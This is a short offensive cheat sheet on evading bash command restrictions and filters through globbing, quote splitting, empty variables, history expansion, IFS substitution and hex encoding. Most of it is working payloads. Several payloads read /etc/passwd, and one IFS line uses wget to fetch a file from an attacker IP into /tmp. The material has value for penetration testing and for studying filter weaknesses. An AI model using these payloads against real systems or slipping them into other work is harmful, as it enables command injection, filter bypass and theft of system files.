# Bypass Bash Restrictions

## Bypass Paths and forbidden commands

```bash
#Bash substitudes * fror any possible chat tha refers to a binary in the folder
/usr/bin/p?ng #This equals /usr/bin/ping

#Bash substitudes * fror any compatible combination with a binary in the folder
/usr/bin/who*mi #This equals /usr/bin/whoami

#[chars]
/usr/bin/n[c] #/usr/bin/nc

#Concatenatipn
'p'i'n'g #Equals to call ping
"w"h"o"a"m"i
\u\n\a\m\e \-\a

#Uninitialized variables: A uninitialized variable equals to null (nothing)
p${u}i${u}n${u}g #Equals to ping, use {} to put the uninitialized variables between valid characteres
cat$u /etc$u/passwd$u #Use the uninitilized variable without {} before any symbol

#Fake commands
p$(u)i$(u)n$(u)g #Equals to ping but 3 errors trying to exeute "u" are shown
w`u`h`u`o`u`a`u`m`u`i #Equals to whoami but 5 errors trying to exeute "u" are shown

#Concating strings using history
!-1 #This will be substitude by the last command executed, and !-2 by the penultimate command
mi #This will throw an error
whoa #This will throw an error
!-1!-2 #This will execute whoami

```

## Bypass forbidden spaces

```bash
##{form}
{cat,lol.txt} #This will cat the file

##IFS - Internal field separator, change " " for any othe character ("]" in this case)
#IFS withut modifications
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

#Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b #Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` #Using cat twice
#Other way, just change each space for ${IFS}
echo${IFS}test

##Using hex format
X=$'cat\x20/etc/passwd'&&$X

##New lines
p\
i\
n\
g #This 4 lines will equal to ping

##Undefined variables and !
$u $u#This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a #This equals to uname -a
```

## Bypass IPs

```bash
#Decimal IPs
127.0.0.1 == 2130706433
```

## More

Check more possible bypasses here: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection\#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)

## References

{% embed url="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" %}

{% embed url="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" %}

{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" %}



